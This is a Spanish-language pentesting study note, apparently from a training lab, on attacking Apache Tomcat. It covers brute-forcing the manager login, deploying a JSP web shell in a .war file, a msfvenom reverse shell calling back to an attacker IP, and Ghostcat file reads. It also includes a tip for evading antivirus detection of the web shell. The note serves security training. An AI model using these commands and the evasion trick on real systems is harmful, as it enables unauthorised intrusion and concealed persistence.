---
tags:
  - Web/Red-Team
  - Tomcat
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de Tomcat]]"
Nota siguiente: "[[00 - Descubrimiento y enumeración de Jenkins]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

El camino clásico: <mark style="background: #FFB86CA6;">acceder al `/manager` con credenciales débiles → subir un `.war` con web shell → RCE</mark>. Y si el AJP está expuesto, Ghostcat como alternativa.

# Brute force del Tomcat Manager

Tomcat usa **HTTP Basic auth** (credenciales en base64). Se fuerza el `/manager/html` con la wordlist de defaults:

```shell-session
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 > set VHOST web01.inlanefreight.local
msf6 > set RPORT 8180 ; set RHOSTS 10.129.201.58 ; set STOP_ON_SUCCESS true
msf6 > run
[+] Login Successful: tomcat:admin
```

Alternativas: **Burp Intruder**, o un script propio (`mgr_brute.py -U http://host:8180/ -P /manager -u users.txt -p pass.txt`). Los wordlists de Metasploit (`tomcat_mgr_default_userpass.txt`) cubren los defaults típicos.

# WAR upload → RCE

El rol `manager-gui` permite desplegar aplicaciones subiendo un **`.war`**. Se empaqueta un JSP web shell y se despliega:

```shell-session
$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
$ zip -r backup.war cmd.jsp        # deploy en /manager/html → /backup/cmd.jsp
$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
uid=1001(tomcat) gid=1001(tomcat)
```

O un reverse shell con `msfvenom` (Tomcat extrae y despliega el `.war` solo):

```shell-session
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
# deploy + nc -lnvp 4443
```

El módulo `multi/http/tomcat_mgr_upload` automatiza todo. **Limpiar** siempre con *Undeploy* (anotando ruta y hash para el informe).

> [!warning]+ Evasión de AV en el web shell
> Detalle útil: el `cmd.jsp` estándar lo marcan 2/58 motores. <mark style="background: #8000E1A6;">Un cambio trivial (cambiar `"Uploaded:"` por `"uPlOaDeD:"`) baja la detección a 0/58</mark> — recordatorio de lo frágiles que son las firmas por strings. Usar nombre aleatorio (MD5), limitar por IP de origen y password-protegerlo.

# Ghostcat (CVE-2020-1938)

<mark style="background: #FF5582A6;">LFI **no autenticada** por el conector **AJP** (puerto 8009)</mark>, en Tomcat < 9.0.31 / 8.5.51 / 7.0.100. Un `8009/tcp open ajp13` en el escaneo es la señal:

```shell-session
$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

Solo lee ficheros **dentro del webapp** (no `/etc/passwd`), pero el [[00 - Descubrimiento y enumeración de Tomcat|`WEB-INF/web.xml`]] y otros ficheros sensibles bastan; y si además se puede subir un fichero, escala a RCE.

> [!info]+ Modernización
> El vector default-creds → WAR sigue siendo el #1 en 2026. Ghostcat aún aparece en instancias con AJP expuesto. Añadir a la lista <mark style="background: #FFB86CA6;">**CVE-2024-50379 / CVE-2024-56337**</mark> (RCE por *race condition* de `PUT` parcial en sistemas de ficheros case-insensitive con el DefaultServlet en escritura). Herramientas: `nuclei -tags tomcat`, `ajpy`/nuclei para Ghostcat, `hydra`/msf para el brute del manager (ver [[00 - Introducción al brute forcing|Brute Forcing]]).

Siguiente: el servidor de CI/CD que corre sobre servlet containers, [[00 - Descubrimiento y enumeración de Jenkins|Jenkins]].
